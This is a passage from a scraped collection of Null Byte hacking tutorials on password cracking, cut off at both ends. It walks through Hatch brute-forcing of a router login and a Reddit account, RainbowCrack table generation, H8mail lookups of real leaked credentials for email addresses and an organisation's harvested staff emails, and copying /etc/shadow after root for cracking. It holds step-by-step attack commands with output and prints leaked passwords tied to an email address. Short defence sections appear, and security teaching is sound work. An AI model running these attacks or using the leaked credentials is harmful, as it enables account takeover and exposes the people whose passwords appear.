You should see a result like below.\nC:\\> python2\nPython 2.7.13 (vs.7.13:a06454b1afa1, Dec 17 2016, 20:53:40) [MSC v.1500 64 bit (AMD64)] on win32\nType \"help\", \"copyright\", \"credits\", or \"license\" for more information.\nIf you don't, you can download Python2. Once your Python2 is installed, type the following commands to install dependencies.\nC:\\> pip2 install selenium\nC:\\> pip2 install requests\nStep 2: Install the Chrome Driver\nNext, we'll need to install the driver that allows us to control Chrome from the Python program. To do so, we will download a file from the Chrome Driver website, and then create a folder called webdrivers on your C drive. Move the downloaded file into this folder. While you can place it in another directory, you would need to modify the Python code.\nStep 3: Download Hatch & Install\nTo install Hatch, you can change directory into your C drive before cloning it to make sure you can find it, or change to another location that you'll be able to find. Type cd .. to go to the C drive of your computer, if that's where you want. You can then download a forked version of Hatch from the GitHub page by opening a terminal window and typing the following.\nC:\\> git clone https://github.com/nsgodshall/Hatch.git\nThis forked version has been modified to work on Windows. Once it is done downloading, you can type cd Hatch to change directories into the download folder.\nC:\\> cd Hatch\nStep 4: Run Hatch & Select Your Router Login\nNow that we have Hatch on our system and all of the dependencies installed, it's time to run Hatch and look at the way it works. First, let's look at the help file by running the following from inside the Hatch folder.\nC:\\> python2 main.py -h\nYou should see an output like below.\nC:\\Documents\\PythonScripts\\Hatch (master -> origin)\nλ python2 main.py -h\nUsage: main.py [options]\n-h, --help                        show this help message and exit\n-u USERNAME, --username=USERNAME  Choose the username\n--usernamesel+USERNAMESEL         Choose the username selector\n--passsel=PASSSEL                 Choose the password selector\n--loginsel=LOGINSEL               Choose the login button selector\n--passlist+PASSLIST               Enter the password list directory\n--website=WEBSITE                 choose a website\nWe can see the main options for Hatch here. To start, let's pick a target on our local network to attack.\nA good device on your local network to test this on would be something like a router, a printer, or some other device with a login page on the network. You can select this by running an Nmap scan on the network to find any IP addresses that have port 80 open. While port 80 is the most common page for web access, you can also search for ports 81, 8080, 8081, 443 to locate the login pages of various devices.\nNext, we'll need to find the subnet range so that we can scan the local network. To find this, you can use ipcalc to calculate your subnet range after finding your computer's local IP address. If your computer, for example, has an IP address of 192.168.0.3, you can run ipcalc 192.168.0.3 to get the IP range for all possible IP addresses on that network. In this case, that would be 192.168.0.0/24.\nOnce you know the range, run the following Nmap scan on your network, with the iprange portion changed to add the IP range of your network.\nC:\\> sudo nmap -p 80,8080,81,8081,443 iprange\nWhen this scan returns, any service that lists the port as \"open\" should be hosting a website. Navigate to one like a printer or router that you have permission to log in to by entering the IP address followed by a colon and the port number we discovered in Nmap. You should see a login page like this:\nStep 5: Identify the Login Elements\nNow, we can run Hatch, but we'll still need some more information in order to pull off this attack. Run Hatch by typing the following command, after navigating to the folder you saved the program to earlier.\nC:\\> python2 main.py\nA Google Chrome window should open, allowing us to navigate to a website we want to attack and begin identifying the parts of the website we want to manipulate.\nC:\\Documents\\PythonScripts\\Hatch (master -> origin)\nλ python2 main.py -h\nDevTools listening on ws://127.0.0.1:6735/devtools/browser/24db43f7-d0d7-4756-8a2c-94676e65bb8f\n_    _       _       _\n| |  | |     | |     | |\n| |__| | __ _| |_ ___| |__\n|  __  |/ _` | __/ __| '_ \\\n| |  | | (_| | || (__| | | |\n|_|  |_|\\__,_|\\__\\___|_| |_|\n[-]--> V.1.0\n[-]--> coded by Metachar\n[-]--> brute-force tool\n[~] Enter a website: http://202.216.246.99/\n[!] Checking if site exists [OK]\nEnter the URL to the target website's login page into the first prompt from Hatch. It will check to make sure the website exists and can be accessed. Next, we'll need to identify the login and password elements of the website we're attacking.\nOn our target login page, right-click on the \"Username\" element, then click on \"Inspect.\"\nNext, click on the ellipsis (•••) to the left of the window, and a drop-down menu will appear. Click on \"Copy,\" and then \"Copy selector\" to copy what Hatch will need to select and interact with this element. It should look something like \"#username.\"\nEnter the username selector into Hatch, and then repeat the process with the \"Password\" selector.\nC:\\Documents\\PythonScripts\\Hatch (master -> origin)\nλ python2 main.py -h\nDevTools listening on ws://127.0.0.1:6735/devtools/browser/24db43f7-d0d7-4756-8a2c-94676e65bb8f\n_    _       _       _\n| |  | |     | |     | |\n| |__| | __ _| |_ ___| |__\n|  __  |/ _` | __/ __| '_ \\\n| |  | | (_| | || (__| | | |\n|_|  |_|\\__,_|\\__\\___|_| |_|\n[-]--> V.1.0\n[-]--> coded by Metachar\n[-]--> brute-force tool\n[~] Enter a website: http://202.216.246.99/\n[!] Checking if site exists [OK]\n[~] Enter the username selector: #username\n[~] Enter the password selector: #passwd\n[~] Enter the Login button selector:\nFinally, right-click on the \"Login\" button to get the selector information, and add that to Hatch as well.\nNow that we have the elements selected, we'll set the username that we're trying to brute-force. In this case, we'll just type admin. The final step will be to select the default list that comes with Hatch. This is \"passlist.txt\" by default, so we'll use this list in our first attack.\nC:\\Documents\\PythonScripts\\Hatch (master -> origin)\nλ python2 main.py -h\nDevTools listening on ws://127.0.0.1:6735/devtools/browser/24db43f7-d0d7-4756-8a2c-94676e65bb8f\n_    _       _       _\n| |  | |     | |     | |\n| |__| | __ _| |_ ___| |__\n|  __  |/ _` | __/ __| '_ \\\n| |  | | (_| | || (__| | | |\n|_|  |_|\\__,_|\\__\\___|_| |_|\n[-]--> V.1.0\n[-]--> coded by Metachar\n[-]--> brute-force tool\n[~] Enter a website: http://202.216.246.99/\n[!] Checking if site exists [OK]\n[~] Enter the username selector: #username\n[~] Enter the password selector: #passwd\n[~] Enter the Login button selector: #login_ok\n[~] Enter the username to brute-force: admin\n[~] Enter a directory to a password list: passlist.txt\nDevTools listerning on ws://127.0.0.1:7827/devtools/browser/0d90faa9-4f25-41a6-bd30-444cdff7705d\nDevTools listerning on ws://127.0.0.1:7848/devtools/browser/33d370d5-46db-4d56-b5f4-a78554e07316\nThis password list isn't huge, but it does contain many common passwords. Press Return, and Hatch will open a new window to begin brute-forcing the password with the dictionary attack. You can watch the progress either from the terminal window or by watching the Chrome window that Hatch is automating.\nC:\\Documents\\PythonScripts\\Hatch (master -> origin)\nλ python2 main.py -h\nDevTools listening on ws://127.0.0.1:6735/devtools/browser/24db43f7-d0d7-4756-8a2c-94676e65bb8f\n_    _       _       _\n| |  | |     | |     | |\n| |__| | __ _| |_ ___| |__\n|  __  |/ _` | __/ __| '_ \\\n| |  | | (_| | || (__| | | |\n|_|  |_|\\__,_|\\__\\___|_| |_|\n[-]--> V.1.0\n[-]--> coded by Metachar\n[-]--> brute-force tool\n[~] Enter a website: http://202.216.246.99/\n[!] Checking if site exists [OK]\n[~] Enter the username selector: #username\n[~] Enter the password selector: #passwd\n[~] Enter the Login button selector: #login_ok\n[~] Enter the username to brute-force: admin\n[~] Enter a directory to a password list: passlist.txt\nDevTools listerning on ws://127.0.0.1:7827/devtools/browser/0d90faa9-4f25-41a6-bd30-444cdff7705d\nDevTools listerning on ws://127.0.0.1:7848/devtools/browser/33d370d5-46db-4d56-b5f4-a78554e07316\n------------------------\nTried password: 123456\nfor user: admin\n------------------------\n------------------------\nTried password: password\nfor user: admin\n------------------------\n------------------------\nTried password: qwerty\nfor user: admin\n------------------------\n------------------------\nTried password: Hackthis1\nfor user: admin\nStep 6: Update Your Wordlist & Run Against an External Website\nIf you're not happy with the wordlist included in Hatch, you can add to it by opening it in a text editor like Nano or adding another wordlist from any repository of wordlists, such as those leaked from data breaches. After downloading a wordlist of your choice, you can add it to the \"Hatch\" folder, and select it instead of the default list.\n* Don't Miss: Automate Brute-Force Attacks for Nmap Scans\nOnce you have a password list you're happy with, let's go ahead and test this on a standard website. Create a throwaway account on Reddit.com or another site, and remember the login name. Set the password of the account to one that's on one of the word lists.\nAfter the dummy account is set up, rerun Hatch, and enter reddit.com/login (or the login page for the website you chose). Next, paste the selectors into the login, password, and button selector. Finally, enter the target username, and select the password list containing the right credentials. Press Return, and the script should open a Chrome window and begin automating the attack.\nOnce the script detects a successful login, it will output the password that succeeded. While the original script tended to skip this and output the wrong password on Windows, my friend Nick modified the code to prevent this from happening in his forked version. If you get any weirdness from the forked version, you can always try the original Hatch version.\n⠀⠀_    _       _       _\n| |  | |     | |     | |\n| |__| | __ _| |_ ___| |__\n|  __  |/ _` | __/ __| '_ \\\n| |  | | (_| | || (__| | | |\n|_|  |_|\\__,_|\\__\\___|_| |_|\n[-]--> V.1.0\n[-]--> coded by Metachar\n[-]--> brute-force tool\n[~] Enter a website: http://www.reddit.com/login\n[!] Checking if site exists [~] Enter the username selector: #loginUsername\n[~] Enter the password selector: #loginPassword\n[~] Enter the Login button selector: body > div > div > div.PageColumn.PageColumn__right > div > form > fieldset:nth-child(10) > button\n[~] Enter the username to brute-force: hackthisaccountNB\n[~] Enter a directory to a password list: passlist.txt\nDevTools listerning on ws://127.0.0.1:11301/devtools/browser/6fd2f19e-9fef-4921-863f-d3316ec3b808\nDevTools listerning on ws://127.0.0.1:11318/devtools/browser/f8d672c9-8e46-477c-a93d-baf0ea6b50e1\n------------------------\nTried password: 123456\nfor user: hackthisaccountNB\n------------------------\n------------------------\nTried password: password\nfor user: hackthisaccountNB\n------------------------\n------------------------\nTried password: qwerty\nfor user: hackthisaccountNB\n------------------------\nAN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS!\nLAST PASS ATTEMPT BELOW\nPassword has been found: qwerty\nHave fun :)\nHow to Defend Against Brute-Forcing\nWebsites have the best ability to defend against these attacks by making sure to implement common-sense brute-forcing safeguards for dictionary and other types of attacks. Should a regular user be able to try to log in with the wrong password from a strange IP address 100 times? The answer is probably no. Be extra careful of websites that don't take these sorts of precautions, as they will be extra vulnerable to losing your account information.\nOn the user side, picking strong, random passwords and storing them in a password manager can help make sure your password never ends up in a password list. In general, using two-factor authentication whenever possible is your best defense against these sorts of tactics, as you'll be alerted of the login attempt. For important accounts, you should always have two-factor authentication enabled.\nI hope you enjoyed this guide to using Hatch for automating dictionary attacks against web logins! If you have any questions about this tutorial on web dictionary attacks or you have a comment, feel free to write it below in the comments or reach me on Twitter @KodyKinzie.\nJust updated your iPhone? You'll find new features for Podcasts, News, Books, and TV, as well as important security improvements and fresh wallpapers. Find out what's new and changed on your iPhone with the iOS 17.5 update.\nCover photo and screenshots by Kody/Null Byte",
        "category": "Password Cracking"
    },
    {
        "title": "Create Rainbow Tables for Hashing Algorithms Like MD5, SHA1 & NTLM",
        "link": "https://null-byte.wonderhowto.com/how-to/create-rainbow-tables-for-hashing-algorithms-like-md5-sha1-ntlm-0193022/",
        "content": "* WonderHowTo\nA rainbow table can be thought of like a dictionary, except instead of words and their definitions, it holds combinations of characters on one side and their hashed form on the other. What is a hash and why would you want to know what random combinations of characters are hashed into?\nPasswords on the internet are almost always stored hashed. A hash is a method of cryptography that is very cheap to calculate in one direction but very expensive to calculate in the opposite direction. What that means is that you can take a raw text input, say the string password, and run a hashing algorithm on it such as MD5 to get an output of 5F4DCC3B5AA765D61D8327DEB882CF99.\nWhile MD5 may be being replaced by stronger hashing methods such as bcrypt, it's still commonly used on LAMP stacks across the internet today.\nGoing back to rainbow tables, we should have an entry saying password on one side and 5F4DCC3B5AA765D61D8327DEB882CF99 on the other. Should we ever come across this hash, we can search our table, find it, and learn what the original string was. However, before we can do that, we must learn how to make a rainbow table.\nFor this guide, I'll be demonstrating from a base of Kali Linux running in a virtual machine, but the instructions for most Linux distros will be basically the same. I will also include some information for those on the Windows platform.\nStep 1: Set Up RainbowCrack\nWe'll be using RainbowCrack to create and sort our tables. Kali Linux comes with RainbowCrack already installed, but if you don't have it or are running on Windows, you can download it or use aptitude if you are on a Debian-based distro like Mint.\nOn Windows, once you have downloaded RainbowCrack, create a new folder that you can easily navigate to with Command Prompt and extract everything into it. Then, open the Command Prompt, and navigate to the directory you created. Move on to Step 2, since the next paragraphs are for Kali.\nIn Kali, once we're sure RainbowCrack is installed, we'll need to create a new folder and navigate into it. This is where our tables will be generated and sorted (see Step 3 and 4 for exceptions). You can use the following commands to set up the folder in your home directory. It's best to use a new and empty directory for the sorting process that comes after the table is generated.\nmkdir RainbowTables\ncd RainbowTables\nIt's important to keep in mind that rainbow tables take up enormous amounts of storage space, especially when you include a wide character set and a long max length. Make sure you have room for hundreds of gigabytes at the very least. Having at least half a terabyte free is better. If you don't have this space available, you can still follow along using smaller character sets, shorter max lengths, and shorter chain lengths.\nStep 2: View the Parameters\nOnce we're in the directory we created, we can run rtgen to make sure everything is installed correctly. This will also return some convenient help, with some example usages of rtgen and the naming of parameters.\nRainbowCrack 1.7\nCopyright 2017 RainbowCrack Project. All rights reserved.\nhttp://project-rainbowcrack.com/\nusage: rtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index\nrtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index -bench\nhash algorithms implemented:\nlm HashLen=8 PlaintextLen=0-7\nntlm HashLen=16 PlaintextLen=0-15\nmd5 HashLen=16 PlaintextLen=0-15\nsha1 HashLen=20 PlaintextLen=0-20\nsha256 HashLen=32 PlaintextLen=0-20\nrtgen md5 loweralpha 1 7 0 1000 1000 0\nrtgen md5 loweralpha 1 7 0 -bench\nAs you can see, there are two usages given with one example for each:\nrtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index chain_len chain_num part_index\nrtgen md5 loweralpha 1 7 0 1000 1000 0\nrtgen hash_algorithm charset plaintext_len_min plaintext_len_max table_index -bench\nrtgen md5 loweralpha 1 7 0 -bench\nOf course, because of the space constraints, the parameters aren't really explained, so I'll do that so it's easier to follow along later.\n* hash_algorithm: This is the hash algorithm that we want our rainbow tables to use. You can see a list of available algorithms under hash algorithms implemented in the return text. For our example, we will use MD5, but RainbowCrack is just as capable of making perfect SHA1 and NTLM tables, and I will provide the code for the tables for all three.\n* charset: The set of characters used to generate the plain-text strings for the rainbow tables. Numeric is digits 0–9, loweralpha is alphanumeric (all letters and digits 0–9), but only in lowercase. For a full list of charsets that you can use, see \"charset.txt\" that comes with RainbowCrack.\n* plaintext_len_min: The minimum length of plaintext strings. For example, if we choose a numeric charset and a min and max of 1, our table will contain all digits 0–9 and their hashed equivalent.\n* plaintext_len_max: The maximum length of plaintext strings. For example, if we choose a min of 1 and a max of 2, we get all digits 0–9 and 00–99 and their hashed equivalents in our table.\n* table_index: This parameter selects the reduction function. A reduction function is a math formula that trims the number of combinations by removing combinations that are incredibly unlikely to be used. By doing so, it lowers computational time drastically. But the flip-side is that there is a tiny possibility that any given reduction function will skip the combination we're looking for, so \"perfect\" tables use multiple runs with different reduction functions to make tables that are \"perfect,\" containing every possible combination.\n* chain_len: This controls the length of each table. The larger this number is, the more plaintexts are hashed and stored in the table. This is why the reduction function mentioned above matters — it will reduce possible combinations to the chain length you picked. The flip-side of having a long chain length is generation time. If you want a table that is \"perfect\" and vast, it can take months.\n* chain_num: This is the number of chains to generate. Each chain will be 16 bytes.\n* part_index: This is for situations where your hard disk space or computing power is limited, or when your filesystem is unable to address extraordinarily large files. We can change this from the 0 that it should normally be to segment the table file into smaller parts.\n* -bench: This is a flag that you can add to do a benchmark on the settings that you have selected. It will not actually create any rainbow tables, it will just determine some numbers that you can use to determine how fast you can generate table entries. Based off of that, you can determine how long table generation will actually take.\nStep 3: Generate the Rainbow Tables\nNow, let's generate those tables! Note, if you're using Windows instead of Linux, you may have to use rtgen.exe instead of just rtgen in my examples below. Run each of the commands below separately. But be warned, these will take hours to fully generate. You can hit Ctrl-C on your keyboard to quit, and the next time you run the same command, it will resume where it left off.\nrtgen md5 loweralpha-numeric 1 7 0 2400 24652134 0\nrtgen md5 loweralpha-numeric 1 7 1 2400 24652134 0\nrtgen md5 loweralpha-numeric 1 7 2 2400 24652134 0\nrtgen md5 loweralpha-numeric 1 7 3 2400 24652134 0\nrtgen md5 loweralpha-numeric 1 7 4 2400 24652134 0\nrtgen md5 loweralpha-numeric 1 7 5 2400 24652134 0\nThe commands above generate six different rainbow tables using the loweralpha-numeric charset which contains 36 possible characters. For any plaintext falling into that category, we will have over a 99% chance of having its hashed equivalent in our tables.\nrtgen md5 loweralpha-numeric 1 7 0 2400 24652134 0\nrainbow table md5_loweralpha-numeric#1-7_0_2400x24652134_0.rt parameters\nhash algorithm:         md5\nhash length:            16\ncharset name:           loweralpha-numeric\ncharset data:           abcdefghijklmnopqrstuvwxyz0123456789\ncharset data in hex:    61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f 70 71 72 73 74 75 76 77 78 79 7a 30 31 32 33 34 35 36 37 38 39\ncharset length:         36\nplaintext length range: 1 - 7\nreduce offset:          0x00000000\nplaintext total:        80603140212\nsequential starting point begin from 0 (0x0000000000000000)\ngenerating...\n65536 of 24652134 rainbow chains generated (0 m 21.3 s)\n131072 of 24652134 rainbow chains generated (0 m 32.8 s)\n196608 of 24652134 rainbow chains generated (0 m 32.2 s)\n262144 of 24652134 rainbow chains generated (0 m 32.9 s)\n327680 of 24652134 rainbow chains generated (0 m 32.2 s)\n393216 of 24652134 rainbow chains generated (0 m 33.0 s)\n458752 of 24652134 rainbow chains generated (0 m 33.3 s)\n524288 of 24652134 rainbow chains generated (0 m 34.0 s)\n589824 of 24652134 rainbow chains generated (0 m 33.3 s)\n655360 of 24652134 rainbow chains generated (0 m 33.8 s)\n720896 of 24652134 rainbow chains generated (0 m 33.0 s)\n786432 of 24652134 rainbow chains generated (0 m 32.3 s)\n851968 of 24652134 rainbow chains generated (0 m 34.0 s)\n917504 of 24652134 rainbow chains generated (0 m 34.3 s)\n983040 of 24652134 rainbow chains generated (0 m 34.4 s)\n1048576 of 24652134 rainbow chains generated (0 m 33.7 s)\nWhen each rainbow table is finished, it will be saved as the .rt file that the command generates, putting it into your current directory. So each rainbow table will get its own unique .rt file. Note that on newer versions, rainbow tables may be saved in your /usr/share/rainbowcrack directory instead of your current directory.\nIf you are trying to create tables for SHA1 or NTLM, or perhaps a different charset and length for MD5, you can reference the tables created by the RainbowCrack team. At the bottom of the page, you can select the algorithm you are looking for to view a list of the commands to run to build your own.\nStep 4: Sort the Rainbow Tables\nOur rainbow table generation is done, but we can't use them just yet. We need to sort them into one table that we can then efficiently search. Luckily, doing this is easy, we just run:\nAs long as we are in the directory we generated them in, the rtsort . command will turn all the tables we generated into easy-to-search .rt files. These files will be accessible in the directory we chose, in this case, Rainbow Tables in the home directory. However, in some versions of Rainbow Crack, all .rt files will be saved in the /usr/share/rainbowcrack directory, no matter what directory you're currently in. The command above should still work when in the folder you created in Step 1.\nNow you have a near perfect rainbow table at your disposal. We'll discuss what we can do with this table, how to do it, and how to protect yourself from people attempting to use rainbow tables to crack your passwords in another guide coming soon.",
        "category": "Password Cracking"
    },
    {
        "title": "Exploit Recycled Credentials with H8mail to Break into User Accounts",
        "link": "https://null-byte.wonderhowto.com/how-to/exploit-recycled-credentials-with-h8mail-break-into-user-accounts-0188600/",
        "content": "* WonderHowTo\nMany online users worry about their accounts being breached by some master hacker, but the more likely scenario is falling victim to a bot written to use leaked passwords in data breaches from companies like LinkedIn, MySpace, and Tumblr. For instance, a tool called H8mail can search through over 1 billion leaked credentials to discover passwords that might still be in use today.\nHow Your Password Ends Up in a Data Breach\nData breaches frequently make headlines, but it's often not apparent to the users impacted how this puts them at risk. Breaches are not all the same and can contain anything from credit reports to a simple email address. The information in a breach can also be stored in different ways, with the worst-case scenario being passwords stored in cleartext.\nThe most common alternative to cleartext is storing the information as plaintext in a more secure form like a hash. Unfortunately, a hash does not solve the problem, because many hashes themselves can be brute-forced. Password breaches involving passwords hashed with SHA-1 can still reveal plaintext passwords if they're common or easy-to-guess passwords.\nHackers take advantage of these issues by buying and selling lists of stolen user details, with credit card numbers and passwords at the top of the list. Over time, many of the most-traded lists become publicly known.\n* Don't Miss: Use Leaked Password Databases to Create Brute-Force Wordlists\nIn one instance, a colossal aggregate file called the \"Breach Compilatio\" was discovered to hold 1.4 billion credentials from various company data breaches. Once leaked to the internet, its aggregated credentials database provided the foundation for widescreen exploitation of accounts belonging to the accounts of users who reuse passwords between accounts.\nAttacking Recycled Credentials with H8mail\nH8mail is a tool for finding plaintext passwords from this massive data breach using only a person's email. This is most useful when combined with OSINT tactics like finding all the email addresses in an organization using tools like TheHarvester, then feeding the resulting list into H8mail. I found this to be extremely effective at finding plaintext passwords for at least one person in a large organization, and the passwords tended to be terrible.\n* Don't Miss: Scrape Target Email Addresses with TheHarvester\nroot@nickles:~/h8mail# python3 h8mail.py -t XXXXXXXXX@gmail.com -bc '/media/root/R3DL34D3R/BreachCompilation'  --local\n._____. ._____.     ;___________;\n| ._. | | ._. |     ; h8mail.py ;\n| |_| |_|_|_| |     ;-----------;\n|___| |_______|  Heartfelt Email OSINT\n.___|_|_| |___.   Use responsibly etc\n| ._____| |_. | ;____________________;\n| |_| | | |_| | ; github.com/khast3x ;\n|_____| |_____| ;--------------------;\n=> XXXXXXXXX@gmail.com\nResult XXXXXXXXX@gmail.com\n-----------------------------\n=> breached ✓\nBreaches found HIBP: 0\nBreaches found breachcompilation: 12\nTarget hostname: gmail.com\nbreachcompilation passwords: ssa123 123456789 18796-0em 1882564 3982262 6 6,91459E+11 asdf1234 jhedgeland kelly23 qwasqw12 rjyatnf777\n-------------------------------\nThe passwords stored in the database may be somewhat skewed towards bad passwords because data dumps with hashed passwords would likely still contain many passwords too strong to be easily brute-forced. Because of this, most of the email and password pairs extracted from hashed data breaches tend to be the absolute worst passwords.\nWhat You'll Need\nTo use a tool like H8mail, we'll need the tool itself, and a data source. One perfectly acceptable way of using H8mail is to connect it to an API, but another is to download the entire breach compilation file and configure H8mail to search it locally.\nAs I mentioned previously, the breach compilation database is 1.4 billion credentials organized into a list with no duplicated passwords and split into folders that make it easy and fast to search through. This database also forms the core of the Have I Been Pwned database, although that service merely lets you know a breach has occurred on that email address and what the source of the breach is.\nBefore we start, we'll need to have Python3 installed and be ready to install some prerequisites. I recommend using Kali Linux, and make sure to run apt get update to update your system before starting. If you don't, it could cause problems later in the installation.\nStep 1: Download H8mail & Data Sources\nAfter navigating to the GitHub repository, clone the repository with the following command.\ngit clone https://github.com/khast3x/h8mail.git\nYou'll need NodeJS installed for H8mail to work properly, so install it by typing the following in a terminal window.\napt-get install nodejs\nNext, you'll need to change the directory to the one just downloaded, and then install the requirements with pip. I recommend using pip3, as pip3 did work for me while pip did not. To do so, type the following into a terminal window and wait for the requirements to finish installing.\npip3 install -r requirements.txt\nOnce the prerequisites are taken care of, you can run h8mail.py to see the options available. From inside the h8mail folder downloaded, run the Python script with the following command, which will bring up the help menu. Here, you'll see the options available in H8mail.\npython3 ./h8mail.py -h\npython3 h8mail.py -h\nusage: h8mail.py -h -t TARGET_EMAILS -c CONFIG_FILE -o OUTPUT_FILE\n-bc BC_PATH -v -l -k CLI_APIKEYS\nEmail information and password finding tool\noptional arguments:\n-h, --help show this help message and exit\n-t TARGET_EMAILS, --targets TARGET_EMAILS\nEither single email, or file (one email per line).\n-c CONFIG_FILE, --config CONFIG_FILE\nConfiguration file for API keys\n-o OUTPUT_FILE, --output OUTPUT_FILE\nFile to write output\n-bc BC_PATH, --breachcomp BC_PATH\nPath to the breachcompilation Torrent.\n[https://ghostbin.com/paste/2cbdn ]\n-v, --verbose Show debug information\n-l, --local Run local actions only\n-k CLI_APIKEYS, --apikey CLI_APIKEYS\nPass config options. Format is \"K:V,K:V\"\nStep 2: Use H8mail Against a Single Email\nWe'll be using the local option, which means downloading the breach compilation for this demonstration. If you prefer to use the API option, you'll need to follow the instructions on GitHub for adding the API keys for whatever service you wish to use.\nDownloading the breach compilation is relatively easy to do and only took one Google search and torrenting a 44 GB magnet file. I won't link to the file directly, but any hacker worth their salt can find the breach compilation available from public sources. Once you have the breach compilation file, a basic search can be conducted by using the following string.\npython3 h8mail.py -t email@tosearch.com -bc 'location_of_your_file/BreachCompilation' --local\nThis calls Python3 to execute h8mail.py, with the arguments set for targeting email@tosearch.com as the email for searching, bc for breach compilation, and then the location of the breach compilation folder on your computer with --local at the end to denote that the files are saved locally. With this command, you can check any email address you want. If you get a hit, it looks like this:\n=> aquaunitpatrolsquad@gmail.com\nResult aquaunitpatrolsquad@gmail.com\n---------------------------\n=> breached ✓\nBreaches found HIBP: 0\nBreaches found breachcompilation: 1\nTarget hostname: gmail.com\nbreachcompilation passwords: handbanana tonight...you\n-------------------------------\nStep 3: Search for Passwords from Groups of Email Accounts\nNow that you can search for individual accounts, let's combine what you've learned in previousguides to search for all the emails you can find for an organization. For my example, I'm using priceline.com. First, we'll use TheHarvester to gather email addresses from the priceline.com domain.\nFor whatever reason, a sizable number of Priceline employees use PGP, so running TheHarvester against the PGP keyserver gave me enough email addresses to create a sizable list of company email addresses.\ntheharvester -d priceline.com -l 1000 -b pgp\nAfter copying the list that is returned, you can create a target file by typing the following and then pasting the found emails into the text editor that opens.\nnano targets.txt\nOnce you've done this, type Ctrl-X and select Y to save your changes, then you can run H8mail against all the emails in your target list at once. To do so, use the following command.\npython3 h8mail.py -t '/root/h8mail/targets.txt' -bc '~/BreachCompilation' --local\nThe command may take some time to complete. When it's done, you're likely to find at least some breached passwords from the list of employee emails. Stunningly, we didn't find any from the Priceline list, but if I did, I probably wouldn't be able to publish the results anyway.\nThese examples are just the start of what you can do with H8mail, and you can use your imagination to think of how being able to search for passwords belonging to long lists of people's email addresses might be useful.\nPassword Recycling Is the Biggest Threat to the Average User\nNow that we've demonstrated how easy it is to use a list of organizational email addresses to search for password breaches, it's easy to see how important it is not to reuse passwords between websites. The biggest cause for concern is that some of your online accounts may use the same old passwords that have been breached already, opening you up to the risk of bots armed with your email address and an old password taking control of your online accounts.\n* Don't Miss: Use Google's Advanced Protection Program for Extra Security\nThe best way to protect against this vulnerability is to use strong, unique passwords for each website. This also means not using patterns that are predictable, because often there are multiple breached passwords for a single email address, meaning a hacker will know if there is an obvious pattern to your passwords.\nPassword managers like LastPass can help create and store strong passwords, and the ultimate way of defending against these attacks is two-factor authentication, preferably with a hardware key. By using a FIDO security key, any device wanting to log into your account and knowing your password will still need the physical key to log in, making the password the attacker has much less useful.\nYou can set up two-factor authentication on most online accounts, and I highly recommend doing so if you've been guilty of the bad habit of reusing passwords. Between two-factor authentication and using password managers to maintain and remember strong, unique passwords, the average user can reduce their risk substantially against this kind of attack.\nI hope you enjoyed this guide to using H8mail to find breached passwords belonging to a targeted email! If you have any questions about this tutorial on H8mail or you have a comment, feel free to reach me in the comments below or on Twitter @KodyKinzie.",
        "category": "Password Cracking"
    },
    {
        "title": "Crack Shadow Hashes After Getting Root on a Linux System",
        "link": "https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/",
        "content": "* WonderHowTo\nAfter gaining access to a root account, the next order of business is using that power to do something more significant. If the user passwords on the system can be obtained and cracked, an attacker can use them to pivot to other machines if the login is the same across systems. There are two tried-and-true password cracking tools that can accomplish this: John the Ripper and Hashcat.\n* Previously: Perform Local Privilege Escalation Using a Linux Kernel Exploit\nPasswd & Shadow File Overview\nA couple files of particular interest on Linux systems are the /etc/passwd and /etc/shadow files. The /etc/passwd file contains basic information about each user account on the system, including the root user which has full administrative rights, system service accounts, and actual users. There are seven fields in each line of /etc/passwd. A typical line looks something like this:\nmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash\nThe first field is the user's login name. The second field traditionally contained an encrypted password, but nowadays (unless you get extremely lucky) it merely contains the letter \"x,\" to denote that a password has been assigned. If this field is blank, the user does not need to supply a password to log in.\nThe third field is the user ID, a unique number assigned to the user, followed by the group ID in the fourth field. The fifth field is typically the full name of the user, although this can also be left blank. The sixth field is the user's home directory, and finally, the seventh field is the default shell, usually set to /bin/bash.\nThe /etc/shadow file contains the encrypted passwords of users on the system. While the /etc/passwd file is typically world-readable, the /etc/shadow is only readable by the root account. The shadow file also contains other information such as password expiration dates. A typical line in /etc/shadow will look like this:\nmsfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::\nSince we have achieved root-level access with our kernel exploit, we can use these files to uncover passwords of other users in the hopes of pivoting to other systems and furthering exploitation.\nCracking Hashes with John the Ripper\nThe first thing we need to do is copy the contents of /etc/passwd and /etc/shadow into their own text files on our local machine; let's call them passwd.txt and shadow.txt, respectfully.\ncat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System 